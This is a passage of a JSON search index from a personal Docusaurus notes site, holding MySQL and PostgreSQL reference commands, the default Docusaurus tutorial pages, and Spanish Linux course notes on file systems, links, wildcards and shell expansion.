[
  {
    "id": 0,
    "title": "0referencia",
    "content": "\r\n## Conexión\r\n\r\n- **Conectar a la base de datos con usuario + dirección + pw**\r\n\r\n  ```sh\r\n    mysql -u <nombre-usuario> -h <IP-servidor-mysql> -p<pw> --port <puerto>\r\n  ```\r\n\r\n---\r\n\r\n## Consola MySQL\r\n\r\n- **Mostrar las bases de datos existentes**\r\n\r\n  ```sql\r\n  show databases;\r\n  ```\r\n\r\n- **Cambiar contraseña root**\r\n\r\n  ```sql\r\n  ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';\r\n  ```\r\n\r\n---\r\n\r\n## Backups\r\n\r\n- **Crear backups de una db**\r\n\r\n  ```sh\r\n  mysqldump -u root -h 127.0.0.1 -p12345678 db_schema > dump.sql\r\n  ```\r\n\r\n- **Importar un backup a un schema existente**\r\n\r\n  ```sh\r\n  mysql -u root -h 127.0.0.1 -p schema_existente < dump.sql\r\n  ```\r\n",
    "path": "/database/mysql/0referencia"
  },
  {
    "id": 1,
    "title": "0referencia",
    "content": "\r\n## Configuración remota\r\n\r\n- Comprobar ip y puerto de postgress\r\n\r\n  ```sh\r\n  sudo netstat -nlt | grep 5432\r\n  ```\r\n\r\n- Modificar el archivo postgresql.conf\r\n- Modificar la linea:\r\n\r\n  ```conf\r\n  listen_addresses = 'localhost'\r\n  listen_addresses = '\\*'\r\n  ```\r\n\r\n## Terminal\r\n\r\n- **Conexion a una base de datos**\r\n\r\n  ```sh\r\n  psql -d <nombre-bd> -U <usuario>\r\n  ```\r\n\r\n- **Crear backup**\r\n\r\n  ```sh\r\n  pg_dump -h localhost -p 5432 -U postgres -d test > backup.sql\r\n  ```\r\n\r\n- **Crear un backup remoto de un contenedor al host**\r\n\r\n  ```sh\r\n  docker exec -ti postgres_test bash -c \"pg_dump -h localhost -p 5432 -U postgres -d test\" > backup.sql\r\n  ```\r\n",
    "path": "/database/postgresql/0referencia"
  },
  {
    "id": 2,
    "title": "Tutorial Intro",
    "content": "\r\n# Tutorial Intro\r\n\r\nLet's discover **Docusaurus in less than 5 minutes**.\r\n\r\n## Getting Started\r\n\r\nGet started by **creating a new site**.\r\n\r\nOr **try Docusaurus immediately** with **[docusaurus.new](https://docusaurus.new)**.\r\n\r\n### What you'll need\r\n\r\n- [Node.js](https://nodejs.org/en/download/) version 18.0 or above:\r\n  - When installing Node.js, you are recommended to check all checkboxes related to dependencies.\r\n\r\n## Generate a new site\r\n\r\nGenerate a new Docusaurus site using the **classic template**.\r\n\r\nThe classic template will automatically be added to your project after you run the command:\r\n\r\n```bash\r\nnpm init docusaurus@latest my-website classic\r\n```\r\n\r\nYou can type this command into Command Prompt, Powershell, Terminal, or any other integrated terminal of your code editor.\r\n\r\nThe command also installs all necessary dependencies you need to run Docusaurus.\r\n\r\n## Start your site\r\n\r\nRun the development server:\r\n\r\n```bash\r\ncd my-website\r\nnpm run start\r\n```\r\n\r\nThe `cd` command changes the directory you're working with. In order to work with your newly created Docusaurus site, you'll need to navigate the terminal there.\r\n\r\nThe `npm run start` command builds your website locally and serves it through a development server, ready for you to view at http://localhost:3000/.\r\n\r\nOpen `docs/intro.md` (this page) and edit some lines: the site **reloads automatically** and displays your changes.\r\n",
    "path": "/docusaurus/intro"
  },
  {
    "id": 3,
    "title": "Congratulations!",
    "content": "\r\n# Congratulations!\r\n\r\nYou have just learned the **basics of Docusaurus** and made some changes to the **initial template**.\r\n\r\nDocusaurus has **much more to offer**!\r\n\r\nHave **5 more minutes**? Take a look at **[versioning](../tutorial-extras/manage-docs-versions.md)** and **[i18n](../tutorial-extras/translate-your-site.md)**.\r\n\r\nAnything **unclear** or **buggy** in this tutorial? [Please report it!](https://github.com/facebook/docusaurus/discussions/4610)\r\n\r\n## What's next?\r\n\r\n- Read the [official documentation](https://docusaurus.io/)\r\n- Modify your site configuration with [`docusaurus.config.js`](https://docusaurus.io/docs/api/docusaurus-config)\r\n- Add navbar and footer items with [`themeConfig`](https://docusaurus.io/docs/api/themes/configuration)\r\n- Add a custom [Design and Layout](https://docusaurus.io/docs/styling-layout)\r\n- Add a [search bar](https://docusaurus.io/docs/search)\r\n- Find inspirations in the [Docusaurus showcase](https://docusaurus.io/showcase)\r\n- Get involved in the [Docusaurus Community](https://docusaurus.io/community/support)\r\n",
    "path": "/docusaurus/tutorial-basics/congratulations"
  },
  {
    "id": 4,
    "title": "Create a Blog Post",
    "content": "\r\n# Create a Blog Post\r\n\r\nDocusaurus creates a **page for each blog post**, but also a **blog index page**, a **tag system**, an **RSS** feed...\r\n\r\n## Create your first Post\r\n\r\nCreate a file at `blog/2021-02-28-greetings.md`:\r\n\r\n```md title=\"blog/2021-02-28-greetings.md\"\r\n---\r\nslug: greetings\r\ntitle: Greetings!\r\nauthors:\r\n  - name: Joel Marcey\r\n    title: Co-creator of Docusaurus 1\r\n    url: https://github.com/JoelMarcey\r\n    image_url: https://github.com/JoelMarcey.png\r\n  - name: Sébastien Lorber\r\n    title: Docusaurus maintainer\r\n    url: https://sebastienlorber.com\r\n    image_url: https://github.com/slorber.png\r\ntags: [greetings]\r\n---\r\n\r\nCongratulations, you have made your first post!\r\n\r\nFeel free to play around and edit this post as much as you like.\r\n```\r\n\r\nA new blog post is now available at [http://localhost:3000/blog/greetings](http://localhost:3000/blog/greetings).\r\n",
    "path": "/docusaurus/tutorial-basics/create-a-blog-post"
  },
  {
    "id": 5,
    "title": "Create a Document",
    "content": "\r\n# Create a Document\r\n\r\nDocuments are **groups of pages** connected through:\r\n\r\n- a **sidebar**\r\n- **previous/next navigation**\r\n- **versioning**\r\n\r\n## Create your first Doc\r\n\r\nCreate a Markdown file at `docs/hello.md`:\r\n\r\n```md title=\"docs/hello.md\"\r\n# Hello\r\n\r\nThis is my **first Docusaurus document**!\r\n```\r\n\r\nA new document is now available at [http://localhost:3000/docs/hello](http://localhost:3000/docs/hello).\r\n\r\n## Configure the Sidebar\r\n\r\nDocusaurus automatically **creates a sidebar** from the `docs` folder.\r\n\r\nAdd metadata to customize the sidebar label and position:\r\n\r\n```md title=\"docs/hello.md\" {1-4}\r\n---\r\nsidebar_label: 'Hi!'\r\nsidebar_position: 3\r\n---\r\n\r\n# Hello\r\n\r\nThis is my **first Docusaurus document**!\r\n```\r\n\r\nIt is also possible to create your sidebar explicitly in `sidebars.js`:\r\n\r\n```js title=\"sidebars.js\"\r\nexport default {\r\n  tutorialSidebar: [\r\n    'intro',\r\n    // highlight-next-line\r\n    'hello',\r\n    {\r\n      type: 'category',\r\n      label: 'Tutorial',\r\n      items: ['tutorial-basics/create-a-document'],\r\n    },\r\n  ],\r\n};\r\n```\r\n",
    "path": "/docusaurus/tutorial-basics/create-a-document"
  },
  {
    "id": 6,
    "title": "Create a Page",
    "content": "\r\n# Create a Page\r\n\r\nAdd **Markdown or React** files to `src/pages` to create a **standalone page**:\r\n\r\n- `src/pages/index.js` → `localhost:3000/`\r\n- `src/pages/foo.md` → `localhost:3000/foo`\r\n- `src/pages/foo/bar.js` → `localhost:3000/foo/bar`\r\n\r\n## Create your first React Page\r\n\r\nCreate a file at `src/pages/my-react-page.js`:\r\n\r\n```jsx title=\"src/pages/my-react-page.js\"\r\nimport React from 'react';\r\nimport Layout from '@theme/Layout';\r\n\r\nexport default function MyReactPage() {\r\n  return (\r\n    <Layout>\r\n      <h1>My React page</h1>\r\n      <p>This is a React page</p>\r\n    </Layout>\r\n  );\r\n}\r\n```\r\n\r\nA new page is now available at [http://localhost:3000/my-react-page](http://localhost:3000/my-react-page).\r\n\r\n## Create your first Markdown Page\r\n\r\nCreate a file at `src/pages/my-markdown-page.md`:\r\n\r\n```mdx title=\"src/pages/my-markdown-page.md\"\r\n# My Markdown page\r\n\r\nThis is a Markdown page\r\n```\r\n\r\nA new page is now available at [http://localhost:3000/my-markdown-page](http://localhost:3000/my-markdown-page).\r\n",
    "path": "/docusaurus/tutorial-basics/create-a-page"
  },
  {
    "id": 7,
    "title": "Deploy your site",
    "content": "\r\n# Deploy your site\r\n\r\nDocusaurus is a **static-site-generator** (also called **[Jamstack](https://jamstack.org/)**).\r\n\r\nIt builds your site as simple **static HTML, JavaScript and CSS files**.\r\n\r\n## Build your site\r\n\r\nBuild your site **for production**:\r\n\r\n```bash\r\nnpm run build\r\n```\r\n\r\nThe static files are generated in the `build` folder.\r\n\r\n## Deploy your site\r\n\r\nTest your production build locally:\r\n\r\n```bash\r\nnpm run serve\r\n```\r\n\r\nThe `build` folder is now served at [http://localhost:3000/](http://localhost:3000/).\r\n\r\nYou can now deploy the `build` folder **almost anywhere** easily, **for free** or very small cost (read the **[Deployment Guide](https://docusaurus.io/docs/deployment)**).\r\n",
    "path": "/docusaurus/tutorial-basics/deploy-your-site"
  },
  {
    "id": 8,
    "title": "Markdown Features",
    "content": "\r\n# Markdown Features\r\n\r\nDocusaurus supports **[Markdown](https://daringfireball.net/projects/markdown/syntax)** and a few **additional features**.\r\n\r\n## Front Matter\r\n\r\nMarkdown documents have metadata at the top called [Front Matter](https://jekyllrb.com/docs/front-matter/):\r\n\r\n```text title=\"my-doc.md\"\r\n// highlight-start\r\n---\r\nid: my-doc-id\r\ntitle: My document title\r\ndescription: My document description\r\nslug: /my-custom-url\r\n---\r\n// highlight-end\r\n\r\n## Markdown heading\r\n\r\nMarkdown text with [links](./hello.md)\r\n```\r\n\r\n## Links\r\n\r\nRegular Markdown links are supported, using url paths or relative file paths.\r\n\r\n```md\r\nLet's see how to [Create a page](/create-a-page).\r\n```\r\n\r\n```md\r\nLet's see how to [Create a page](./create-a-page.md).\r\n```\r\n\r\n**Result:** Let's see how to [Create a page](./create-a-page.md).\r\n\r\n## Images\r\n\r\nRegular Markdown images are supported.\r\n\r\nYou can use absolute paths to reference images in the static directory :\r\n\r\n\r\n\r\n\r\nYou can reference images relative to the current file as well. This is particularly useful to colocate images close to the Markdown files using them:\r\n\r\n\r\n\r\n## Code Blocks\r\n\r\nMarkdown code blocks are supported with Syntax highlighting.\r\n\r\n````md\r\n```jsx title=\"src/components/HelloDocusaurus.js\"\r\nfunction HelloDocusaurus() {\r\n  return <h1>Hello, Docusaurus!</h1>;\r\n}\r\n```\r\n````\r\n\r\n```jsx title=\"src/components/HelloDocusaurus.js\"\r\nfunction HelloDocusaurus() {\r\n  return <h1>Hello, Docusaurus!</h1>;\r\n}\r\n```\r\n\r\n## Admonitions\r\n\r\nDocusaurus has a special syntax to create admonitions and callouts:\r\n\r\n```md\r\n:::tip My tip\r\n\r\nUse this awesome feature option\r\n\r\n:::\r\n\r\n:::danger Take care\r\n\r\nThis action is dangerous\r\n\r\n:::\r\n```\r\n\r\n:::tip My tip\r\n\r\nUse this awesome feature option\r\n\r\n:::\r\n\r\n:::danger Take care\r\n\r\nThis action is dangerous\r\n\r\n:::\r\n\r\n## MDX and React Components\r\n\r\n[MDX](https://mdxjs.com/) can make your documentation more **interactive** and allows using any **React components inside Markdown**:\r\n\r\n```jsx\r\nexport const Highlight = ({children, color}) => (\r\n  <span\r\n    style={{\r\n      backgroundColor: color,\r\n      borderRadius: '20px',\r\n      color: '#fff',\r\n      padding: '10px',\r\n      cursor: 'pointer',\r\n    }}\r\n    onClick={() => {\r\n      alert(`You clicked the color ${color} with label ${children}`)\r\n    }}>\r\n    {children}\r\n  </span>\r\n);\r\n\r\nThis is <Highlight color=\"#25c2a0\">Docusaurus green</Highlight> !\r\n\r\nThis is <Highlight color=\"#1877F2\">Facebook blue</Highlight> !\r\n```\r\n\r\nexport const Highlight = ({children, color}) => (\r\n  <span\r\n    style={{\r\n      backgroundColor: color,\r\n      borderRadius: '20px',\r\n      color: '#fff',\r\n      padding: '10px',\r\n      cursor: 'pointer',\r\n    }}\r\n    onClick={() => {\r\n      alert(`You clicked the color ${color} with label ${children}`);\r\n    }}>\r\n    {children}\r\n  </span>\r\n);\r\n\r\nThis is <Highlight color=\"#25c2a0\">Docusaurus green</Highlight> !\r\n\r\nThis is <Highlight color=\"#1877F2\">Facebook blue</Highlight> !\r\n",
    "path": "/docusaurus/tutorial-basics/markdown-features"
  },
  {
    "id": 9,
    "title": "Manage Docs Versions",
    "content": "\r\n# Manage Docs Versions\r\n\r\nDocusaurus can manage multiple versions of your docs.\r\n\r\n## Create a docs version\r\n\r\nRelease a version 1.0 of your project:\r\n\r\n```bash\r\nnpm run docusaurus docs:version 1.0\r\n```\r\n\r\nThe `docs` folder is copied into `versioned_docs/version-1.0` and `versions.json` is created.\r\n\r\nYour docs now have 2 versions:\r\n\r\n- `1.0` at `http://localhost:3000/docs/` for the version 1.0 docs\r\n- `current` at `http://localhost:3000/docs/next/` for the **upcoming, unreleased docs**\r\n\r\n## Add a Version Dropdown\r\n\r\nTo navigate seamlessly across versions, add a version dropdown.\r\n\r\nModify the `docusaurus.config.js` file:\r\n\r\n```js title=\"docusaurus.config.js\"\r\nexport default {\r\n  themeConfig: {\r\n    navbar: {\r\n      items: [\r\n        // highlight-start\r\n        {\r\n          type: 'docsVersionDropdown',\r\n        },\r\n        // highlight-end\r\n      ],\r\n    },\r\n  },\r\n};\r\n```\r\n\r\nThe docs version dropdown appears in your navbar:\r\n\r\n![Docs Version Dropdown](./img/docsVersionDropdown.png)\r\n\r\n## Update an existing version\r\n\r\nIt is possible to edit versioned docs in their respective folder:\r\n\r\n- `versioned_docs/version-1.0/hello.md` updates `http://localhost:3000/docs/hello`\r\n- `docs/hello.md` updates `http://localhost:3000/docs/next/hello`\r\n",
    "path": "/docusaurus/tutorial-extras/manage-docs-versions"
  },
  {
    "id": 10,
    "title": "Translate your site",
    "content": "\r\n# Translate your site\r\n\r\nLet's translate `docs/intro.md` to French.\r\n\r\n## Configure i18n\r\n\r\nModify `docusaurus.config.js` to add support for the `fr` locale:\r\n\r\n```js title=\"docusaurus.config.js\"\r\nexport default {\r\n  i18n: {\r\n    defaultLocale: 'en',\r\n    locales: ['en', 'fr'],\r\n  },\r\n};\r\n```\r\n\r\n## Translate a doc\r\n\r\nCopy the `docs/intro.md` file to the `i18n/fr` folder:\r\n\r\n```bash\r\nmkdir -p i18n/fr/docusaurus-plugin-content-docs/current/\r\n\r\ncp docs/intro.md i18n/fr/docusaurus-plugin-content-docs/current/intro.md\r\n```\r\n\r\nTranslate `i18n/fr/docusaurus-plugin-content-docs/current/intro.md` in French.\r\n\r\n## Start your localized site\r\n\r\nStart your site on the French locale:\r\n\r\n```bash\r\nnpm run start -- --locale fr\r\n```\r\n\r\nYour localized site is accessible at [http://localhost:3000/fr/](http://localhost:3000/fr/) and the `Getting Started` page is translated.\r\n\r\n:::caution\r\n\r\nIn development, you can only use one locale at a time.\r\n\r\n:::\r\n\r\n## Add a Locale Dropdown\r\n\r\nTo navigate seamlessly across languages, add a locale dropdown.\r\n\r\nModify the `docusaurus.config.js` file:\r\n\r\n```js title=\"docusaurus.config.js\"\r\nexport default {\r\n  themeConfig: {\r\n    navbar: {\r\n      items: [\r\n        // highlight-start\r\n        {\r\n          type: 'localeDropdown',\r\n        },\r\n        // highlight-end\r\n      ],\r\n    },\r\n  },\r\n};\r\n```\r\n\r\nThe locale dropdown now appears in your navbar:\r\n\r\n![Locale Dropdown](./img/localeDropdown.png)\r\n\r\n## Build your localized site\r\n\r\nBuild your site for a specific locale:\r\n\r\n```bash\r\nnpm run build -- --locale fr\r\n```\r\n\r\nOr build your site to include all the locales at once:\r\n\r\n```bash\r\nnpm run build\r\n```\r\n",
    "path": "/docusaurus/tutorial-extras/translate-your-site"
  },
  {
    "id": 11,
    "title": "Linux. Preparación del entorno",
    "content": "\r\n# Linux. Preparación del entorno\r\n\r\nPreparación del entorno de aprendizaje.\r\n\r\n- [Índice curso Linux](./docs/Indice+curso+Linux.pdf)\r\n- [Distribuciones Linux](https://upload.wikimedia.org/wikipedia/commons/1/1b/Linux_Distribution_Timeline.svg)\r\n\r\n## Herramientas de virtualización\r\n\r\n- VMWare\r\n- VirtualBox\r\n\r\n## Entornos MacOS\r\n\r\nPara la arquitectura Apple Silicon (ARM64) se debe instalar una distribución compatible, tipo ubuntu ARM (que se utiliza tambien para raspberry)\r\n- [Ubuntu ARM](https://ubuntu.com/download/server/arm)",
    "path": "/linux/environment"
  },
  {
    "id": 12,
    "title": "Linux. Sistema de ficheros Avanzado",
    "content": "\r\n# Linux. Sistema de ficheros Avanzado\r\n\r\n## Inodos\r\n\r\nLos inodos son estructuras de datos que almacenan información sobre los archivos y directorios en un sistema de archivos. Cada archivo o directorio tiene un inodo único que contiene información sobre el archivo o directorio, como los permisos, el propietario, el grupo, el tamaño, la fecha de creación, la fecha de modificación, la fecha de acceso, el número de enlaces, el tipo de archivo y los punteros a los bloques de datos.\r\n\r\n```sh\r\n# Listar inodos\r\ndf -i\r\n# Ver el inodo de un archivo en un sistema de archivos específico\r\ndf -i /mnt\r\n# Ver el inodo de un archivo\r\nls -i archivo\r\n# Ver el inodo de un archivo avanzado\r\nls -lia archivo\r\n# Ver estadísticas del inodo de un archivo\r\nstat archivo\r\n# Ver estadísticas del inodo de un archivo avanzado\r\nsudo debugfs -R \"stat <inodo>\" /dev/sda1\r\n```\r\n\r\n## Dentries\r\n\r\nLos dentries son estructuras de datos que almacenan información sobre los archivos y directorios en un sistema de archivos. Cada archivo o directorio tiene un dentry único que contiene información sobre el archivo o directorio, como el nombre, el inodo, el tipo de archivo y los punteros a los bloques de datos.\r\n\r\n>Diferencia entre inodo y dentry:\r\n> - inodo: información sobre el archivo o directorio\r\n> - dentry: información sobre el nombre del archivo o directorio\r\n\r\n```sh\r\n# Ver el inodo de un directorio\r\nls -id directorio\r\n# Ver estadísticas de un dentry de un directorio\r\nstat directorio\r\n# Ver estadísticas de un dentry de un directorio avanzado\r\nls -lid directorio\r\n```\r\n\r\n## Enlaces simbólicos\r\n\r\nUn enlace simbólico, también conocido como \"symlink\" o \"enlace blando\", es un archivo especial que actúa como un puntero o referencia a otro archivo o directorio. Es similar a un atajo en Windows.\r\n- Referencia: Un enlace simbólico contiene una ruta al archivo o directorio al que apunta.\r\n- Independencia del archivo original: Si el archivo original es eliminado, el enlace simbólico se queda \"roto\" y apunta a una ruta inexistente.\r\n- Diferentes sistemas de archivos: Los enlaces simbólicos pueden apuntar a archivos ubicados en diferentes sistemas de archivos.\r\n- Permisos: Los permisos del enlace simbólico no afectan al archivo destino, ya que el sistema operativo sigue los permisos del archivo o directorio al que apunta.\r\n\r\n```sh\r\n# Crear un enlace simbólico\r\nln -s archivo enlace\r\n```\r\n\r\n## Enlaces duros\r\n\r\nUn enlace duro es una entrada de directorio que apunta directamente a los datos de un archivo en el sistema de archivos. Todos los enlaces duros a un archivo comparten el mismo contenido.\r\n\r\n- Compartir inodo: Un enlace duro es otra entrada de directorio que apunta al mismo inodo (y por lo tanto a los mismos datos) que el archivo original.\r\n- Mismo sistema de archivos: Los enlaces duros solo pueden existir dentro del mismo sistema de archivos.\r\n- Inmutabilidad del contenido: Si uno de los enlaces duros se modifica, todos los enlaces reflejarán los cambios porque apuntan a los mismos datos.\r\n- Eliminación: El archivo solo se elimina del sistema de archivos cuando el último enlace duro se elimina.\r\n\r\n```sh\r\n# Crear un enlace duro\r\nln archivo enlace\r\n```\r\n\r\n## Wildcards\r\n\r\nLos \"wildcards\" o comodines son caracteres especiales que se utilizan para hacer coincidir patrones de nombres de archivos y directorios en la línea de comandos.\r\n\r\n- `*`: Coincide con cualquier número de caracteres.\r\n- `?`: Coincide con un solo carácter.\r\n- `[]`: Coincide con un solo carácter de los especificados entre corchetes.\r\n- `[!...]`: Coincide con un solo carácter que no está en la lista especificada entre corchetes.\r\n- `{...}`: Coincide con uno de los patrones especificados entre llaves.\r\n- [[:upper:]]: Coincide con un solo carácter en mayúsculas.\r\n- [[:lower:]]: Coincide con un solo carácter en minúsculas.\r\n- [[:digit:]]: Coincide con un solo dígito.\r\n- [[:alnum:]]: Coincide con un solo carácter alfanumérico.\r\n- [[:alpha:]]: Coincide con un solo carácter alfabético.\r\n- [[:space:]]: Coincide con un solo carácter de espacio en blanco.\r\n\r\n    \r\n```sh\r\n# Listar archivos que empiezan por \"a\"\r\nls a*\r\n# Listar archivos que terminan en \".txt\"\r\nls *.txt\r\n# Listar archivos que empiezan por \"a\" y terminan en \".txt\"\r\nls a*.txt\r\n# Listar archivos que empiezan por \"a\" o \"b\"\r\nls [ab]*\r\n# Listar archivos que empiezan por \"a\" o \"b\" y terminan en \".txt\"\r\nls [ab]*.txt\r\n# Listar archivos que empiezan por \"a\" o \"b\" y terminan en \".txt\" o \".md\"\r\nls [ab]*.{txt,md}\r\n# Listar archivos que empiezan por \"a\" o \"b\" y terminan en \".txt\" o \".md\" excluyendo \"a.txt\"\r\nls [ab]*.{txt,md} | grep -v a.txt\r\n```\r\n\r\n## Shell Expansions\r\n\r\nLas \"shell expansions\" o expansiones de la shell son mecanismos que permiten expandir o generar listas de archivos y directorios en la línea de comandos.\r\n\r\n- `*`: Expande a todos los archivos y directorios en el directorio actual.\r\n- `?`: Expande a un solo carácter.\r\n- `[]`: Expande a un solo carácter de los especificados entre corchetes.\r\n- `{...}`: Expande a una lista de palabras separadas por comas.\r\n- `~`: Expande al directorio de inicio del usuario actual.\r\n- `$HOME`: Expande al directorio de inicio del usuario actual.\r\n- `$USER`: Expande al nombre de usuario actual.\r\n- `$PWD`: Expande al directorio actual.\r\n- `$OLDPWD`: Expande al directorio anterior.\r\n- `$PATH`: Expande a la lista de directorios de búsqueda de comandos.\r\n- `$SHELL`: Expande al intérprete de comandos actual.\r\n- `$0`: Expande al nombre del script o comando actual.\r\n- `$1`, `$2`, ...: Expande a los argumentos del script o comando actual.\r\n\r\n```sh\r\necho fichero*\r\necho ~\r\necho *\r\necho /*/log\r\necho $((2+2))\r\necho {1,2,3}\r\necho {01..20}\r\necho {A..Z}\r\necho texto{A{1,2},B{3,4}}\r\nmkdir {2020..2024}-{01..12}\r\n```\r\n\r\n## Command Substitution\r\n\r\nLa \"command substitution\" o sustitución de comandos es un mecanismo que permite ejecutar un comando y utilizar su salida como argumento de otro comando.\r\n\r\n- `$(...)`: Ejecuta el comando entre paréntesis y sustituye su salida.\r\n- ``...``: Ejecuta el comando entre comillas invertidas y sustituye su salida.\r\n\r\n```sh\r\necho $(ls)\r\necho $(date)\r\nls -la $(which cat)\r\necho $(python3 -c 'print(\"Hello, World!\")')\r\n```\r\n\r\n## Comillas en la Shell\r\n\r\nLas comillas en la shell se utilizan para agrupar palabras y evitar la expansión de caracteres especiales.\r\n\r\n>$ ` \\ se interpretan dentro de las comillas dobles, pero no dentro de las comillas simples.\r\n\r\n- Comillas simples (`'...'`): Evitan la expansión de caracteres especiales.\r\n- Comillas dobles (`\"...\"`): Permiten la expansión de variables y comandos.\r\n\r\n```sh\r\necho 'Hello, World!'\r\necho \"Hello, $USER!\"\r\necho \"Today is $(date).\"\r\necho $(ls)\r\necho \"$(ls)\"\r\n# Escapar caracteres especiales\r\necho \"Hello, \\\"World\\\"!\"\r\necho 'Hello, \"World\"!'\r\necho \"Expansion: $USER, Sin expansion: \\$USER\"\r\n# Crear un fichero de nombre: \"fichero espacio.txt\"\r\nls -la fichero\\ espacio.txt\r\necho -e \"Este texto \\t esta tabulado\"\r\necho -e \"Esto es una \\nnueva línea\"\r\n```\r\n",
    "path": "/linux/file-system-advanced"
  },
  {
    "id": 13,
    "title": "Linux. Sistema de ficheros",
    "content": "\r\n# Linux. Sistema de ficheros\r\n\r\n## Shell. Listado de directorios y archivos\r\n\r\n```sh\r\n# listar directorios y archivos\r\nls\r\n# listar directorios y archivos con detalle\r\nls -l\r\n# listar directorios y archivos con detalle y tamaño\r\nls -lh\r\n# listar directorios y archivos con detalle y tamaño en formato legible\r\nls -lah\r\n# listar directorios y archivos con detalle y tamaño en formato legible y ordenados por fecha\r\nls -lhat\r\n# listar directorios y archivos con detalle y tamaño en formato legible y ordenados por fecha en orden inverso\r\nls -lhart\r\n```\r\n\r\n## Shell. Crear directorios y ficheros\r\n\r\n```sh\r\n# Crear directorio\r\nmkdir directorio\r\n# Crear directorio con subdirectorios\r\nmkdir -p directorio/subdirectorio\r\n# Crear fichero\r\ntouch fichero\r\n# Crear fichero con contenido\r\necho \"contenido\" > fichero\r\n# Crear fichero con contenido y añadir contenido\r\necho \"contenido\" >> fichero\r\n```\r\n\r\n## Shell. Editores de texto\r\n\r\n```sh\r\n# nano\r\nnano fichero\r\n# vim\r\nvim fichero\r\n# emacs\r\nemacs fichero\r\n# pico\r\npico fichero\r\n```\r\n\r\n## Shell. Visualizar contenido de ficheros\r\n\r\n```sh\r\n# Tipo de contenido del fichero\r\nfile fichero\r\n# Visualizar contenido de fichero\r\ncat fichero\r\n# Visualizar contenido de fichero con número de línea\r\ncat -n fichero\r\n# Visualizar contenido de fichero con número de línea y mostrar caracteres no imprimibles\r\ncat -T fichero\r\n# Visualizar contenido de fichero con número de línea y mostrar caracteres no imprimibles\r\ncat -Tn fichero\r\n# Visualizar linea a linea\r\nmore fichero\r\n# Visualizar linea a linea avanzado\r\nless fichero # h ayuda, q salir, /buscar, n siguiente, N anterior\r\n\r\n```\r\n\r\n## Shell. Copiar, mover y borrar ficheros\r\n\r\n```sh\r\n# Copiar fichero\r\ncp fichero destino\r\n# Copiar fichero con detalle\r\ncp -v fichero destino\r\n# Copiar fichero con detalle y confirmación\r\ncp -vi fichero destino\r\n# Actualizar fichero\r\ncp -u fichero destino\r\n```\r\n\r\n## Shell. Copiar, mover y borrar directorios\r\n\r\n```sh\r\n# Copiar directorio\r\ncp -r directorio destino\r\n# Copiar directorio con detalle\r\ncp -rv directorio destino\r\n# Copiar directorio con detalle y confirmación\r\ncp -rvi directorio destino\r\n# Actualizar directorio\r\ncp -ru directorio destino\r\n```\r\n\r\n## Shell. Mover ficheros y directorios\r\n\r\n```sh\r\n# Mover fichero\r\nmv fichero destino\r\n# Mover fichero con detalle\r\nmv -v fichero destino\r\n# Mover fichero con detalle y confirmación\r\nmv -vi fichero destino\r\n# Actualizar fichero\r\nmv -u fichero destino\r\n```\r\n\r\n## Shell. Borrar ficheros y directorios\r\n\r\n```sh\r\n# Borrar fichero\r\nrm fichero\r\n# Borrar fichero con detalle\r\nrm -v fichero\r\n# Borrar fichero con detalle y confirmación\r\nrm -vi fichero\r\n# Borrar fichero con detalle y confirmación forzoso\r\nrm -rfvi fichero\r\n# Borrar directorio\r\nrm -r directorio\r\n# Borrar directorio con detalle\r\nrm -rv directorio\r\n# Borrar directorio con detalle y confirmación\r\nrm -rvi directorio\r\n# Borrar directorio con detalle y confirmación forzoso\r\nrm -rfvi directorio\r\n```\r\n\r\n## Shell. Encontrar ficheros y directorios\r\n\r\n```sh\r\n# Encontrar fichero\r\nfind directorio -name fichero\r\n# Encontrar directorio\r\nfind directorio -type d -name subdirectorio\r\n# Encontrar ficheros excluyendo un directorio concreto\r\nfind directorio -name fichero -not -path \"directorio/excluir\"\r\n# Encontrar fichero con detalle\r\nfind directorio -name fichero -ls\r\n# Encontrar fichero con detalle y permisos\r\nfind directorio -name fichero -ls -perm 777\r\n# Encontrar fichero ocultando errores\r\nfind directorio -name fichero 2> /dev/null\r\n# Encontrar fichero por usuario\r\nfind directorio -name fichero -user usuario\r\n# Encontrar ficheros con tamaño mayor a 1M\r\nfind directorio -size +1M\r\n# Encontrar ficheros con tamaño menor a 1M\r\nfind directorio -size -1M\r\n# Encontrar ficheros con tamaño igual a 1M\r\nfind directorio -size 1M\r\n# Encontrar ficheros con tamaño mayor a 1M y menor a 2M\r\nfind directorio -size +1M -size -2M\r\n# Encontrar ficheros con tamaño mayor a 1M y menor a 2M con detalle\r\nfind directorio -size +1M -size -2M -ls\r\n# Encontrar ficheros que contienen texto\r\ngrep -r \"texto\" directorio\r\n# Encontrar ficheros que contienen texto con detalle\r\ngrep -r \"texto\" directorio -n\r\n# Encontrar ficheros que terminan en .txt\r\nfind directorio -name \"*.txt\"\r\n```\r\n\r\n## Shell. Ejercicios de búsqueda\r\n    \r\n```sh\r\n# Buscar el comando ls\r\nfind / -name ls 2> /dev/null\r\n# Buscar directorios con nombre firefox \r\nfind / -name firefox -type d 2> /dev/null\r\n# Buscar el usuario propietario del fichero shadow excluyendo los ficheros que se encuentren el el directorio /snap\r\nfind / -name shadow ! -path \"/snap/*\" -ls 2> /dev/null\r\nfind / -path /snap -prune -o -name shadow -exec ls -l {} \\ 2>/dev/null\r\n```\r\n\r\n## Shell. Principales directorios de Linux\r\n\r\n```sh\r\n# Arbol de directorios de primer nivel\r\ntree / -L 1\r\n```\r\n\r\nInformación de los principales directorios de Linux:\r\n- `/bin`: Contiene los binarios de los comandos básicos del sistema.\r\n- `/boot`: Contiene los ficheros necesarios para el arranque del sistema.\r\n- `/dev`: Contiene los ficheros de dispositivos.\r\n- `/etc`: Contiene los ficheros de configuración del sistema.\r\n- `/home`: Contiene los directorios de los usuarios.\r\n- `/lib`: Contiene las librerías compartidas.\r\n- `/media`: Contiene los puntos de montaje de los dispositivos extraíbles.\r\n- `/mnt`: Contiene los puntos de montaje de los dispositivos.\r\n- `/opt`: Contiene los paquetes de software adicionales.\r\n- `/proc`: Contiene información sobre los procesos del sistema.\r\n- `/root`: Contiene el directorio del usuario root.\r\n- `/run`: Contiene los ficheros temporales del sistema.\r\n- `/sbin`: Contiene los binarios de los comandos del sistema.\r\n- `/srv`: Contiene los datos de los servicios.\r\n- `/sys`: Contiene información sobre el sistema.\r\n- `/tmp`: Contiene los ficheros temporales.\r\n- `/usr`: Contiene los ficheros de los usuarios.\r\n- `/var`: Contiene los ficheros variables del sistema.\r\n\r\n# Shell. Tips\r\n\r\n```sh\r\n# Proceso actual\r\necho $$\r\n# Último proceso\r\necho $!\r\n# Último comando\r\necho $?\r\n# Ver procesos en 